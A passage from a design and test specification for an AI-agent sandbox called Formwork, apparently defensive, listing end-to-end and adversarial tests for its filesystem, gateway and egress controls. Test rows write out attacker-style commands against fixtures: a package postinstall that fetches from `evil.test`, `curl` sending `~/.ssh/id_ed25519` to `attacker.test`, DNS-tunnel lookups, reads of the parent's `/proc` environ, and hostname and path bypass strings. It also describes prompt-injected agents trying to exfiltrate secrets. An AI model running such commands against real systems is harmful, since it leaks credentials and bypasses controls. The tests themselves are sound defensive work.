<a id="fw-e2e-062"></a>**FW-E2E-062: Learning without a denial feed fails fast ([FW-INV5](#fw-inv5)/[FW-INV6](#fw-inv6)).** `formwork learn -- cmd` on a host with no wired denial feed. Pass: the invocation errors *before* the workload spawns, naming the missing feed and the alternatives (`run` + hand-authored grants, `--observe-anyway`); no proposal file appears; with `--observe-anyway` the run is enforced, the absence of observation is reported loudly, and still no proposal is written. Fail: the workload runs and the missing feed is only announced afterwards, or an empty proposal pretends observation happened.

<a id="fw-e2e-063"></a>**FW-E2E-063: Review loop closes over the proposal ([FW-DISC5](#fw-disc5)/[FW-DISC6](#fw-disc6)).** From a proposal holding needs-review candidates, driven entirely through the CLI: listing prints the candidates numbered on stdout (the result stream, present under quiet telemetry); accepting by 1-based number and by exact pattern moves exactly the selected entries into the discovered layer with discovery provenance and rewrites the proposal without them; `--accept-all` consumes the remainder; a credential-floor-matching entry is refused at accept regardless of what the proposal claims ([FW-INV8](#fw-inv8)). Dry-run on any host — the proposal file is input, no kernel needed. Pass: each behavior as stated. Fail: a listing lost to the telemetry channel, an unselected entry consumed, provenance missing, or a floored entry accepted.

<a id="fw-e2e-064"></a>**FW-E2E-064: Short-lived workload denials are captured ([FW-DISC1](#fw-disc1)/[FW-DISC2](#fw-disc2)).** A learning run whose workload dies on its first denial (`cat` of an ungranted file — exiting in well under a second, the canonical discovery shape). Pass: the denied path still appears in the proposal, despite denial-feed persistence latency exceeding the workload's lifetime (collection is anchored to the run start, held open for a minimum settle window — an empty read repeated is never trusted before it — and polled to quiescence under a cap). Fail: an empty proposal because collection read a window the feed had not yet flushed.

<a id="fw-e2e-071"></a>**FW-E2E-071: Linux denial feed via ptrace ([FW-DISC1](#fw-disc1)/[FW-DISC2](#fw-disc2)/[FW-XR6](#fw-xr6)).** On a Landlock-capable Linux host with `strace` installed, `formwork learn -- cmd` runs the workload enforced under an **unconfined** `strace` ancestor tracing a `run --confine-self` shim: the tracer needs no policy hole (it sits outside the wall, is the tracee's ancestor — no Yama exception — and the confined tree cannot reach it, [FW-XR8](#fw-xr8)). Denied file syscalls (`EACCES`/`EPERM` on the open/exec/mutate families — never `stat`/`access` probes, which Landlock does not govern) become denial records: the millisecond-`cat` shape ([FW-E2E-064](#fw-e2e-064)'s property) lands in the proposal with no persistence-latency window at all (the trace is complete when the tracee exits), a credential hit is withheld by the floor ([FW-DISC3](#fw-disc3)) through this tap exactly as through the macOS one, and attribution is exact — only this run's process tree is in the trace. Without `strace` on PATH, or without Landlock, `learn` fails fast naming the gap ([FW-E2E-062](#fw-e2e-062)/[FW-XR9](#fw-xr9)). Pass: each behavior as stated. Fail: a denial the kernel produced is missing from the proposal, a credential is proposed, or the tracer required weakening the policy.

<a id="fw-e2e-085"></a>**FW-E2E-085: Discovery of hosts and channels (both).** `learn` runs a millisecond workload that requests `blocked.test` through the proxy and touches the clipboard, and a second that requests `169.254.169.254`. Pass: `allow:blocked.test` and `channels = ["clipboard"]` are proposed; the metadata address produces a withheld line. Fail: the metadata address is proposed, or a proposal is missing.

### 7.10 Adversarial

<a id="fw-adv-001"></a>**FW-ADV-001: Sandbox shedding.** The confined process attempts, in sequence: `execve` of a setuid binary, `prctl` to clear `NO_NEW_PRIVS`, and re-exec to try to drop the seccomp filter. Pass: all fail; confinement persists across every attempt. Fail: any attempt restores access or relaxes the filter.

<a id="fw-adv-002"></a>**FW-ADV-002: TOCTOU / symlink race.** A loop races creating a symlink from a writable path to a sensitive target and accessing it, attempting to win between check and use. Pass: no access to the sensitive target succeeds; enforcement is at the kernel access, not a userspace pre-check. Fail: the race yields out-of-scope access.

<a id="fw-adv-003"></a>**FW-ADV-003: Gateway bypass.** The agent extracts an MCP endpoint host from a granted tool's metadata and tries to reach that host directly. Pass: direct egress is denied; only the gateway reaches it. Fail: the agent egresses to the endpoint outside the gateway.

<a id="fw-adv-004"></a>**FW-ADV-004: Shading oracle probe.** The agent enumerates candidate tool names and inspects error messages, response timing, and error codes to detect which hidden tools exist. Pass: refusals for hidden-but-real tools are indistinguishable from refusals for nonexistent tools — no oracle. Fail: any signal distinguishes a blocked-existing tool from a nonexistent one.

<a id="fw-adv-005"></a>**FW-ADV-005: fd smuggling.** A confined stdio backend attempts to pass its own descriptors to the agent, or to open new sockets, to widen access. Pass: only the gateway mints egress fds; the backend cannot manufacture or hand off a broader capability. Fail: a confined process obtains or confers access beyond its grant via fd passing.

<a id="fw-adv-006"></a>**FW-ADV-006: Cross-domain socket reach-around (Linux).** The confined process attempts to connect to an abstract UNIX socket and a pathname UNIX socket belonging to a host process outside the domain (e.g., a desktop bus or terminal multiplexer). Pass on capable kernels: blocked via UNIX-socket scoping; on kernels lacking it, the gap is reported Partial and the fail-closed net posture still prevents remote egress. Fail: the confined process talks to an out-of-domain service without the gap being reported.

<a id="fw-adv-012"></a>**FW-ADV-012: Credential oracle probe (path + env).** The agent probes a credential path and reads a credential env var, inspecting errors, codes, and timing. Pass: neither denial nor absence is distinguishable from a nonexistent resource, and neither surfaces an operator prompt that a social-engineering payload could target (extends [FW-ADV-004](#fw-adv-004)). Fail: any oracle exists.

<a id="fw-adv-013"></a>**FW-ADV-013: Discovery confused-deputy.** A prompt-injected agent repeatedly attempts `~/.ssh/id_ed25519` to try to get it proposed and auto-accepted — with the auto-widen zone adversarially drawn over the whole home. Pass: FW-CRED-matched denials never become auto-proposable and never enter the auto-widen path ([FW-INV8](#fw-inv8)); a forged proposal naming the key is refused at accept; the wall holds regardless of attempt count. Fail: persistent probing yields a candidate grant, an auto-accept, or an accepted forgery.

<a id="fw-adv-014"></a>**FW-ADV-014: Launcher-bypass honesty.** The agent is started *without* Formwork (bypassing the launcher). Pass: env vars are present as expected, and the report had already disclosed env-shading as launcher-contingent — i.e. the guarantee was never overclaimed ([FW-CRED8](#fw-cred8)). Fail: the documentation/report implied env-shading holds independent of the launcher.

<a id="fw-adv-015"></a>**FW-ADV-015: Discovery fold cannot re-grant a credential ([FW-INV8](#fw-inv8)).** A credential-shaped file *outside* `$HOME` (`/srv/app/id_rsa`) sits alongside ordinary files that a learning run touches, with the auto-widen zone drawn over the directory. Pass: the key is withheld by the shape floor, its ordinary siblings stay granular (no `…/**` fold that would cover the key), nothing auto-accepted covers it, and a subsequent run still cannot read it — enforcement (deny beats allow) denies the key regardless, and the fold guard keeps the proposal itself honest. Fail: a fold or auto-widen grant transitively covers the withheld credential, or the key is readable in a later run.

<a id="fw-adv-007"></a>**FW-ADV-007: Hostname bypass battery.** With `AllowHosts(["allowed.test"])` and `blocked.test` mapped to the blocked fixture, the agent requests, in turn: `allowed.test\x00.blocked.test`, `allowed%2etest.blocked.test`, `blocked.test#.allowed.test`, `allowed.test.` (trailing dot), `::ffff:127.0.0.1%allowed.test` (IPv6 zone-ID), and an IDN confusable of `allowed.test`. Pass: each canonicalizes to the genuine `allowed.test` or is rejected; none reaches the blocked fixture. Fail: any variant escapes the allowlist. (Mirrors the srt SOCKS5 null-byte disclosure.)

<a id="fw-adv-008"></a>**FW-ADV-008: DNS-rebinding to a blocked IP.** Under a wildcard rule (`tunnel:*.test`), the resolver returns a blocked address (the metadata literal, an RFC-1918 fixture, or a public address mixed with a private one) for `allowed.test`; under the exact rule `allow:allowed.test` it returns the metadata literal. Pass: the gateway refuses at the *resolved answer* — violation, no socket — even though the name is allowlisted; the name-based allow never overrides the class table ([FW-EGR4](#fw-egr4), [FW-EGR17](#fw-egr17)). Fail: the rebind reaches the blocked address. *(Amended by FEP-6 §9 b.)*

<a id="fw-adv-009"></a>**FW-ADV-009: Confused-deputy against the gateway.** A co-resident *unconfined* host process, and separately a *confined* process, each attempt to drive the gateway's egress (to the `allowed.test` fixture) other than through the session's own transport ([FW-XR7](#fw-xr7)). Pass: neither obtains egress; there is no unauthenticated door ([FW-EGR6](#fw-egr6)). Fail: either reaches the fixture through the gateway without the session's transport.

<a id="fw-adv-011"></a>**FW-ADV-011: Env exfiltration is defused in depth.** With one host allowlisted for egress and a prompt-injected instruction to POST the environment to it, the agent attempts the exfiltration. Pass: the secret-shaped vars are not present to send (the now-shipped [FW-ENV2](#fw-env2) scrub), demonstrating the compose of env-scrub with host-scoped egress — neither layer alone is trusted. Fail: a secret-shaped var is both present and egressable.

<a id="fw-adv-016"></a>**FW-ADV-016: Gateway frame bypass (D6).** A batch array, a non-JSON frame, and an id-less `tools/call` for a shaded tool. Pass: none reaches the backend. Fail: any does.

<a id="fw-adv-017"></a>**FW-ADV-017: Path traversal against an inspected rule.** Against `post:allowed.test/repos/acme/**`: `/repos/acme/../other/x`, `/repos/acme/%2e%2e/other/x`, `/repos/acme%2F..%2Fother/x`, and a request carrying both `Content-Length` and `Transfer-Encoding`. Pass: each is refused or canonicalizes outside the scope. Fail: any reaches `/repos/other`.

<a id="fw-adv-018"></a>**FW-ADV-018: Supervisor race (Linux).** A second thread rewrites the `sockaddr` while `connect()` is pending. Pass: the connection lands only where the supervisor's copy was allowed. Fail: it lands at the rewritten address.

<a id="fw-adv-019"></a>**FW-ADV-019: Endpoint theft (macOS).** An unconfined same-uid process holding `P` and the credential connects to the listener. Pass: the peer check refuses it; or, if C2 found the peer check unreliable, the report is `Partial` and names this residual. Fail: the connection is admitted while the report says `Enforced`.

<a id="fw-adv-020"></a>**FW-ADV-020: Exfiltration through a host service (both).** Under `rules = ["allow:allowed.test"]` the agent tries to send a nonce to the `blocked.test` fixture through the opener with a URL argument, an AppleEvent, the Linux fixture service running `curl`, and a clipboard hand-off to an unconfined reader. Pass: the nonce never reaches the fixture, checked after the process tree exits. Fail: it arrives by any route.

<a id="fw-adv-021"></a>**FW-ADV-021: Credential reflection.** Under `broker:anthropic` bound to `allowed.test`, the fixture echoes the request's `x-api-key` in its body with the value split across two writes 50 ms apart, in a response header, and in a gzip-encoded body; the client also sends TRACE. Pass: no byte sequence of length 8 or more from the credential reaches the client, and each case emits `reflection` or a TRACE refusal. Fail: any credential sequence reaches the client.

<a id="fw-adv-022"></a>**FW-ADV-022: Name disagreement.** A CONNECT to `allowed.test` with server name `blocked.test`; a matching server name with `Host: blocked.test` inside an inspected tunnel; a tunnel whose first byte is not `0x16`; a ClientHello offering only `h2` to an inspected host. Pass: each is refused with `sni-mismatch`, `host-mismatch`, `not-tls` or `alpn`, and the blocked fixture sees no connection. Fail: any reaches a fixture.

<a id="fw-adv-023"></a>**FW-ADV-023: Address classes.** Under `allow:*.test`, the resolver fixture answers `127.0.0.1`, `10.0.0.1`, `100.100.100.200`, `168.63.129.16`, `::ffff:169.254.169.254`, `64:ff9b::a9fe:a9fe`, `2002:a9fe:a9fe::1`, `fe80::1`, a public address mixed with `10.0.0.1`, an address of the runner's own interfaces, and the Gateway's own listener address. Then, under the exact rule `allow:allowed.test`, it answers `127.0.0.1` and then `169.254.169.254`. Pass: every wildcard case and the exact-name metadata case are refused with `address-class`, and the exact-name loopback case is admitted. Fail: any other outcome.

<a id="fw-adv-024"></a>**FW-ADV-024: Parser battery ([FW-INV15](#fw-inv15)).** Heads carrying both `Content-Length` and `Transfer-Encoding`, two differing `Content-Length` values, obsolete line folding, a bare LF, a NUL in a header value, an invalid method token, a head over **head-limit**, CONNECT authorities with userinfo, a path, a zone identifier, a percent-encoded dot, or a numeric spelling (`2130706433`, `0x7f.1`, `127.1`), and a truncated ClientHello. Pass: the fixture upstream receives no byte from any of them. Fail: any byte arrives.

### 7.11 Host-service channels & isolation

<a id="fw-e2e-079"></a>**FW-E2E-079: Isolation tier (Linux, both runners).** With `isolate = ["processes"]`. Pass on `ubuntu-22.04`: `/proc` lists only session PIDs, `$TMPDIR` is a tmpfs, `kill` of a host PID fails. Pass on `ubuntu-24.04`: the run is refused before spawn and the message names AppArmor, the `sysctl` remedy, bwrap, and dropping the member. Fail: the tier is applied partially on either.

<a id="fw-e2e-080"></a>**FW-E2E-080: Isolation tier (macOS).** With the same request. Pass: `kill` and `proc_pidinfo` on an unconfined control sibling fail, and the report's `processes` verdict matches what `ps` shows. Fail: a host process is signalable or the report and `ps` disagree.

<a id="fw-e2e-081"></a>**FW-E2E-081: Channels (macOS).** Under the default profile, `open -g -n fixture.app`, `launchctl submit` of a marker job, an AppleEvent to the fixture app, `pbcopy`/`pbpaste` of a nonce, and `security find-generic-password` against a test item in a test keychain are each attempted. Pass: each is denied with a sandbox deny record and no marker appears; with `channels = ["clipboard"]` only the clipboard probe succeeds; with `allow-credentials = ["os-keyring"]` only the keychain probe succeeds. Fail: a marker appears, or a lift opens more than its channel.

<a id="fw-e2e-082"></a>**FW-E2E-082: Channels (Linux).** Against a session `dbus-daemon` and the fixture service under supervised connect: `gdbus call --session`, the fixture's "run this" request, and a connection to a fixture X11-shaped socket. Pass: each is denied with a violation record, and each succeeds under its matching lift. Fail: a denial is missing or a lift opens an unrelated socket.

<a id="fw-e2e-083"></a>**FW-E2E-083: Environment disclosure (both).** An unconfined sibling carries `FW_CANARY=<nonce>`; the control (`ps -E` on macOS, `/proc/<pid>/environ` on Linux) shows it. Pass on macOS: the confined run under the default profile does not show it. Pass on Linux: the default profile shows it and the report says `Partial` with the residual ([FW-E2E-025](#fw-e2e-025) pattern); under `isolate = ["processes"]` on `ubuntu-22.04` it is not shown and the report says `Enforced`. Fail: the report and the observation disagree.

<a id="fw-e2e-088"></a>**FW-E2E-088: Channel groups (both).** Under `channels = ["desktop"]`. Pass: the clipboard and URL-open probes succeed; `screen` and `run-outside` are denied; on Linux `DISPLAY` and `WAYLAND_DISPLAY` are present in the confined environment and `DBUS_SESSION_BUS_ADDRESS` is not; with a downstream `channels = { deny = ["desktop"] }` both probes are denied and `explain desktop` names the denying layer; a base `channels = "deny"` with a downstream `channels = ["clipboard"]` admits the clipboard; `channels = { allow = ["desk"] }` fails at parse listing the valid names. Fail: any branch differs.

<a id="fw-e2e-090"></a>**FW-E2E-090: Brokered `open-url` (both).** Under `channels = ["open-url"]`. Pass: the confined `xdg-open`/`open` of an `https://` URL causes the fixture opener on the host to receive it and the operator channel records it; a `file:` URL is refused with a violation record; `lsopen` (macOS) and the session bus (Linux) stay denied throughout. Fail: the `file:` URL is opened, or a host service is reachable.

### 7.12 Egress scenarios

Each test below runs one of FEP-6's ten operator scenarios (FEP-6 §7.2 gives each configuration, where it fits, and how the engine serves it) in test form: each production host becomes a `.test` name the resolver fixture maps to a fixture, and a Catalog `broker:` entry becomes an inline binding ([FW-BP12](#fw-bp12)), because Catalog bindings name production hosts. Steps run inside the session (`formwork run --blueprint <file> -- sh -c ...`) unless marked "outside", and are checked after the process tree exits. The fixtures, the `fw-egress-probe` binary, and the network-namespace fixture that serves wildcard success paths are FEP-6 §7.1's.

<a id="fw-e2e-098"></a>**FW-E2E-098: The model API and nothing else (S1; both OSes).**
`api.anthropic.com` becomes `model.test`; `blocked.test` is a second fixture. `$FIXTURE_CA` is the
test CA's certificate, readable in the session.

| # | Step | Expected |
|---|---|---|
| 0 | outside: `formwork explain --hosts` | one host, `model.test`, grade inspected, deciding rule `allow:model.test`; the session CA path, constrained to `model.test` |
| 1 | `curl -sS https://model.test/ok` | the fixture's body; the fixture logs one request |
| 2 | `curl -sS https://blocked.test/ok` | curl exit 56, `CONNECT tunnel failed, response 403`; violation `host-not-listed`; `blocked.test` logs nothing |
| 3 | `curl -sS https://169.254.169.254/latest/meta-data/` | curl exit 56; violation `host-not-listed` (the case `ports = [443]` admits) |
| 4 | `curl -sS --noproxy '*' https://<model.test's fixture address>/ok` | curl exit 7; Linux supervisor or macOS Seatbelt refusal record; the fixture logs nothing |
| 5 | `python3 -c 'import socket; socket.getaddrinfo("model.test", 443)'` | `socket.gaierror` |
| 6 | `fw-egress-probe tunnel model.test:443 --sni blocked.test` | violation `sni-mismatch`; neither fixture logs a handshake |
| 7 | `fw-egress-probe inspect model.test:443 --host blocked.test` | `403`; violation `host-mismatch`; `blocked.test` logs nothing |
| 8 | `curl -sS --cacert "$FIXTURE_CA" https://model.test/ok`, standing in for a client that ignores the session CA | curl exit 60; one operator line naming `model.test` and `tunnel:` |
| 9 | row 8 under a blueprint with `tunnel:model.test` in place of `allow:model.test` | the fixture's body; the fixture logs the client's own handshake |

Pass: every row as stated. Fail: any row differs.

<a id="fw-e2e-099"></a>**FW-E2E-099: The agent never holds its API key (S2; both OSes; extends [FW-E2E-078](#fw-e2e-078)).** `api.anthropic.com`
becomes `model.test`. Catalog bindings name production hosts, so the test uses an inline binding
([FW-BP12](#fw-bp12)):
`allow-credentials = [{ name = "model-fixture", env = "FIXTURE_MODEL_KEY", hosts = ["model.test"], scheme = "header:x-api-key" }]`,
with `FIXTURE_MODEL_KEY` set to a random 40-character value in `formwork run`'s environment. A second
fixture, `other.test`, is admitted by `get:other.test/**`.

| # | Step | Expected |
|---|---|---|
| 1 | `printenv FIXTURE_MODEL_KEY` | a `fwcred-` placeholder, not the value the harness set |
| 2 | `curl -sS -H "x-api-key: $FIXTURE_MODEL_KEY" https://model.test/ok` | the fixture's body; the fixture logs `x-api-key` equal to the harness's value |
| 3 | `curl -sS https://model.test/ok` | the fixture logs the harness's value in `x-api-key` (added when absent) |
| 4 | `curl -sS -N -H "x-api-key: $FIXTURE_MODEL_KEY" https://model.test/sse` | 150 events; each reaches curl within 20 ms of the fixture writing it ([FW-E2E-093](#fw-e2e-093)) |
| 5 | `curl -sS -H "x-api-key: $FIXTURE_MODEL_KEY" https://other.test/ok` | `403`; violation `placeholder`; `other.test` logs nothing |
| 6 | `curl -sS -X OPTIONS https://model.test/ok` | the fixture logs the request without `x-api-key` ([FW-CRED18](#fw-cred18)) |
| 7 | after exit: search the session scratch, `$TMPDIR` and the workload's captured output for the harness's value | no match ([FW-INV13](#fw-inv13)) |

Pass: every row as stated. Fail: any row differs.

<a id="fw-e2e-100"></a>**FW-E2E-100: Push and open pull requests in one repository (S3; both OSes).** `github.com` becomes `git.test`, a fixture that
wraps `git http-backend` over bare repositories `acme/widgets.git` and `acme/other.git` and accepts
pushes only with the fixture token. `api.github.com` becomes `api.git.test`, a REST fixture. An
inline binding carries one scheme, so the test uses two:
`{ name = "git-fixture", env = "FIXTURE_GIT_TOKEN", hosts = ["git.test"], scheme = "basic" }` and
`{ name = "api-fixture", env = "FIXTURE_API_TOKEN", hosts = ["api.git.test"], scheme = "bearer" }`.

| # | Step | Expected |
|---|---|---|
| 1 | `git clone https://git.test/acme/widgets.git` | succeeds; the fixture logs `Basic` with the fixture token on the first request |
| 2 | commit a 2 MiB random file; `git push origin HEAD:agent/1` | succeeds; `acme/widgets.git` has `agent/1` with the blob; the receive-pack body arrived chunked and byte-identical ([FW-E2E-092](#fw-e2e-092)) |
| 3 | `curl -sS -X POST https://api.git.test/repos/acme/widgets/pulls -d '{"head":"agent/1","base":"main","title":"t"}'` | `201` from the fixture; the fixture logs `Bearer` with the API token |
| 4 | `git push https://git.test/acme/other.git HEAD:x` | fails with HTTP 403; violation `path`; `acme/other.git` unchanged |
| 5 | `curl -sS -X DELETE https://api.git.test/repos/acme/widgets` | `403`; violation `method` |
| 6 | `curl -sS https://api.git.test/repos/acme/widgets/actions/runs` | `403`; violation `path`, deciding rule the `deny` line |
| 7 | `git config --get-regexp credential; printenv \| grep FIXTURE_` | no credential helper; placeholders only |

Pass: every row as stated. Fail: any row differs.

<a id="fw-e2e-101"></a>**FW-E2E-101: Dependency installs from public registries (S4; both OSes; row 3 Linux only).** `registry.npmjs.org`
becomes `npm.test`, a static registry fixture serving `fixture-pkg`, whose `postinstall` runs
`curl -sS https://evil.test/stage2 || true; node -e "require('net').connect(443, '198.51.100.7')"`.
`pypi.org` and `files.pythonhosted.org` become `pypi.test` (a static simple index) and
`files.pypi.test`. The blueprint also carries `allow:*.cdn.test`.

| # | Step | Expected |
|---|---|---|
| 1 | `npm install --registry https://npm.test/ fixture-pkg` | succeeds; `node_modules/fixture-pkg` exists; `evil.test` logs nothing; violations `host-not-listed` (`evil.test`) and, on Linux, a supervisor refusal for `198.51.100.7:443` |
| 2 | `pip download --no-deps --index-url https://pypi.test/simple/ fixture-pkg` | the wheel downloads from `files.pypi.test` |
| 3 | `curl -sS https://mirror.cdn.test/ok`, answered with the namespace fixture's address | the fixture's body |
| 4 | `curl -sS https://evil.cdn.test/ok`, answered with `127.0.0.1` | curl exit 56; violation `address-class` |
| 5 | outside: `formwork explain --json` | four hosts inspected; the session CA's name constraints list exactly `npm.test`, `pypi.test`, `files.pypi.test` and the `cdn.test` subtree |
| 6 | under a variant with `get,head:npm.test` in place of `allow:npm.test`: `curl -sS -X PUT -d '{}' https://npm.test/fixture-pkg` | `403`; violation `method`; the fixture logs nothing |

Pass: every row as stated. Fail: any row differs.

<a id="fw-e2e-102"></a>**FW-E2E-102: Read-only documentation research (S5; both OSes; row 5 Linux only).** `docs.python.org` becomes
`docs.test`; `*.readthedocs.io` becomes `*.rtd.test`; `api.anthropic.com` becomes `model.test`.

| # | Step | Expected |
|---|---|---|
| 1 | `curl -sS https://docs.test/3/library/` | the fixture's body |
| 2 | `curl -sS -I https://docs.test/3/` | `200` for HEAD |
| 3 | `curl -sS -X POST -d q=1 https://docs.test/search` | `403`; violation `method`; the fixture logs nothing |
| 4 | `curl -sS -X TRACE https://docs.test/` | `403`; violation `method` ([FW-EGR23](#fw-egr23)) |
| 5 | `curl -sS https://proj.rtd.test/en/latest/`, answered with the namespace fixture's address | the fixture's body; the leaf's issuer is the session CA |
| 6 | `curl -sS https://rtd.test/` | curl exit 56; violation `host-not-listed` (a wildcard excludes the apex) |
| 7 | `curl -sS -X POST -d '{}' https://model.test/ok` | the fixture's body: `allow:` admits every method, unlike the documentation hosts |

Pass: every row as stated. Fail: any row differs.

<a id="fw-e2e-103"></a>**FW-E2E-103: Intranet by name, egress through the corporate proxy (S6; both OSes).** `proxy.test` is a CONNECT-proxy fixture that
records each CONNECT line and forwards to the fixture addresses. `model.test` is reached through it.
`git.corp.test` is a fixture on `127.0.0.2`. `formwork run` gets `HTTPS_PROXY=http://proxy.test:3128`
and `NO_PROXY=.corp.test`.

| # | Step | Expected |
|---|---|---|
| 1 | `curl -sS https://model.test/ok` | the fixture's body; `proxy.test` logs `CONNECT model.test:443` |
| 2 | `curl -sS https://git.corp.test/ok` | the fixture's body; `proxy.test` logs nothing for it |
| 3 | `curl -sS --noproxy '*' http://<proxy.test's address>:3128/` | curl exit 7; refusal record; `proxy.test` logs nothing |
| 4 | outside: `formwork explain --json` | `model.test` classification `Partial`, reason naming the upstream proxy; `git.corp.test` `Enforced` |
| 5 | a second blueprint with only `allow:*.corp.test`: `curl -sS https://git.corp.test/ok` | curl exit 56; violation `address-class` |

Pass: every row as stated. Fail: any row differs.

<a id="fw-adv-025"></a>**FW-ADV-025: Exfiltration attempts against S2 (S7; both OSes).** S2's test form ([FW-E2E-099](#fw-e2e-099)), with the planted fake credentials of FEP-2's fixture home, an attacker fixture `attacker.test` that is not admitted, and `model.test` serving `/reflect` (echoes the request headers in the body; `?gzip=1` compresses; `?in=header` echoes into a response header). Each row names the mechanism that stops it; the last row is what the configuration admits by design.

| # | Attempt | Step | Expected | Mechanism |
|---|---|---|---|---|
| 1 | send a key file to an unlisted host | `curl -sS -d @$HOME/.ssh/id_ed25519 https://attacker.test/` | the read fails with `EACCES`, and the CONNECT gets `403` | credential floor; `host-not-listed` |
| 2 | read the key back through an echo | `curl -sS -H "x-api-key: $FIXTURE_MODEL_KEY" https://model.test/reflect` | connection reset; violation `reflection`; no 8-byte run of the key in curl's output | [FW-CRED17](#fw-cred17) |
| 3 | echo into a header | `…/reflect?in=header` | as row 2 | [FW-CRED17](#fw-cred17) |
| 4 | echo compressed | `…/reflect?gzip=1` | response refused; violation `reflection` | identity coding |
| 5 | carry the placeholder in a query | `curl -sS "https://other.test/?k=$FIXTURE_MODEL_KEY"` | `403`; violation `placeholder` | placeholder scan |
| 6 | raw socket to an address | `python3 -c 'import socket; socket.create_connection(("198.51.100.7", 443))'` | `PermissionError`; refusal record | supervisor (Linux), Seatbelt (macOS) |
| 7 | DNS tunnel | `python3 -c 'import socket; socket.socket(socket.AF_INET, socket.SOCK_DGRAM)'` and `getaddrinfo("c2VjcmV0.attacker.test", 53)` | `PermissionError`; `gaierror` | [FW-ISO11](#fw-iso11), [FW-EGR12](#fw-egr12) |
| 8 | read the Gateway's environment or memory | `cat /proc/$PPID/environ`; `head -c1 /proc/$PPID/mem` (Linux); `kern.procargs2` of `$PPID` (macOS: `ps` is setuid and cannot run in a session) | permission denied on Linux; on macOS the environment reads blank, because `formwork` zeroes it (characterized, C5) | [FW-CRED16](#fw-cred16); [FW-ISO16](#fw-iso16) |
| 9 | front a blocked host behind an admitted name | `fw-egress-probe inspect model.test:443 --host attacker.test` | `403`; violation `host-mismatch` | [FW-EGR10](#fw-egr10) |
| 10 | ask a host service to fetch | `xdg-open "https://attacker.test/?d=1"` (Linux), `open` (macOS) | refused; `attacker.test` logs nothing | FEP-5 channel baseline ([FW-ADV-020](#fw-adv-020)) |
| 11 | send code to the model host | `curl -sS -H "x-api-key: $FIXTURE_MODEL_KEY" -d @src/main.rs https://model.test/v1/messages` | succeeds | admitted by design: an admitted host receives what the agent sends; the floor and the environment scrub bound what the agent has |

Pass: rows 1–10 refused with their records and `attacker.test` logs nothing; row 11 succeeds. Fail:
any refusal row reaches a fixture, or a key byte sequence reaches the session.

<a id="fw-e2e-104"></a>**FW-E2E-104: Blueprints the compiler refuses (S8; pure compile, both OSes).** Each row runs outside the session:
`formwork compile --report-only --blueprint <file>`.

| # | Blueprint lines | Expected | Rule |
|---|---|---|---|
| 1 | `rules = ["tunnel:api.github.com", "get:api.github.com/repos/**"]` | refused; the message names both lines | one grade per host and port ([FW-BP14](#fw-bp14), FEP-6 §9 j) |
| 2 | `rules = ["tunnel:github.com"]` and `allow-credentials = ["broker:github"]` | refused; the message names the lines to use, `allow:github.com` in place of the `tunnel:` line, and `allow:api.github.com` | [FW-CRED12](#fw-cred12) |
| 3 | `rules = ["get:status.corp.internal:80/**"]` and an inline binding bound to `status.corp.internal` | refused; the message names the port-80 rule | [FW-CRED19](#fw-cred19), FEP-6 §9 (i) |
| 4 | `net = { ports = [443] }` and `rules = ["allow:api.anthropic.com"]` | refused | [FW-BP13](#fw-bp13) |
| 5 | `rules = ["tunnel:api.github.com", "deny:api.github.com/repos/acme/secret/**"]` | refused; a path `deny` needs an inspected host | [FW-BP14](#fw-bp14) |
| 6 | `rules = ["allow:*"]` | refused at parse; the message states the host grammar | FEP-5 §4 |
| 7 | `rules = ["tunnel:api.anthropic.com/v1/**"]` | refused at parse; a tunnel has no path (`allow:api.anthropic.com/v1/**` inspects) | FEP-6 §9 j |
| 7a | `rules = ["allow:build/**"]` | refused at parse; a host target needs a dot (a relative path typed by mistake) | [FW-BP16](#fw-bp16) |
| 7b | `rules = ["tunnel:internal.corp.example:8443", "allow:internal.corp.example"]` | compiles; the two rules name different ports | FEP-6 §9 j |
| 8 | `rules = ["deny:telemetry.example.com"]` and no admitting rule | compiles; the report states that egress is denied | [FW-EGR2](#fw-egr2) |

Pass: each row's outcome and named lines as stated. Fail: any row compiles when refusal is stated,
or the reverse.

<a id="fw-e2e-105"></a>**FW-E2E-105: Bootstrapping a CI allowlist with `learn` (S9; both OSes; extends [FW-E2E-085](#fw-e2e-085)).**
`registry.npmjs.org`, `codeload.github.com` and `telemetry.evil.example` become `npm.test`,
`codeload.test` and `evil.test`.

| # | Step | Expected |
|---|---|---|
| 1 | outside: `formwork learn --blueprint ci.toml -- npm ci` | the proposal holds `allow:codeload.test` and `allow:evil.test`, each with provenance; `169.254.169.254` is itemized as withheld |
| 2 | outside: accept `allow:codeload.test` only (`formwork learn --accept`) | the discovered layer holds that one rule |
| 3 | `npm ci` under the accepted blueprint | succeeds; `evil.test` logs nothing; violation `host-not-listed` for `evil.test` |

Pass: every row as stated. Fail: the metadata address is proposed, or `evil.test` receives a request.

<a id="fw-e2e-106"></a>**FW-E2E-106: A test server inside the session (S10; Linux first; blocked on in-session loopback, FEP-6 §11).** A harness fixture outside the session
listens on `127.0.0.1:<port>`.

| # | Step | Expected |
|---|---|---|
| 1 | `node -e` script: listen on `127.0.0.1:0`, then `fetch` it | succeeds |
| 2 | `curl -sS http://127.0.0.1:<fixture port>/` | refused; refusal record; the fixture logs nothing |

Pass: row 1 succeeds and row 2 is refused. Fail: row 1 is refused, or row 2 reaches the fixture. The
macOS form waits for a Seatbelt design that can tell a session-bound port from a host service.

## 8. Performance target

Confinement is setup-once plus per-operation overhead. The target keeps interactive agent loops responsive and the reuse story credible:

| Path | Target |
|---|---|
| Sandbox setup (spawn-confined launch) | < 50 ms added to process start |
| Per-filesystem-op overhead (Landlock/Seatbelt) | negligible; within noise of the raw syscall |
| Gateway round-trip added latency (granted tool) | < 2 ms over a direct backend call, local |
| Full default-profile compile + report | < 5 ms, no kernel calls |
| Egress tunnel grade, added time to first response byte, new connection | < 2 ms median |
| Egress inspected grade, added time per request on a reused connection | < 1 ms median |
| Egress inspected grade, first connection to a host (leaf minting included) | < 5 ms median |

The egress rows are measured on a loopback fixture against the same client connecting directly (FEP-6 §9 f, [FW-E2E-096](#fw-e2e-096)): in release on every CI runner, as a 95% interval for the median added latency, against the targets scaled to the runner's speed (at most 3x).

A reuse-heavy workload ([FW-E2E-020](#fw-e2e-020)/021) must complete within a small bounded overhead of its unsandboxed baseline; a sandbox that materially slows the normal build/test loop violates [FW-TRA6](#fw-tra6).

## 9. Platform backend matrix

**Linux — Landlock + seccomp (+ optional netns for the gateway side).**

- Filesystem read/write scope: Landlock filesystem access rights (available since ABI v1). Clean.
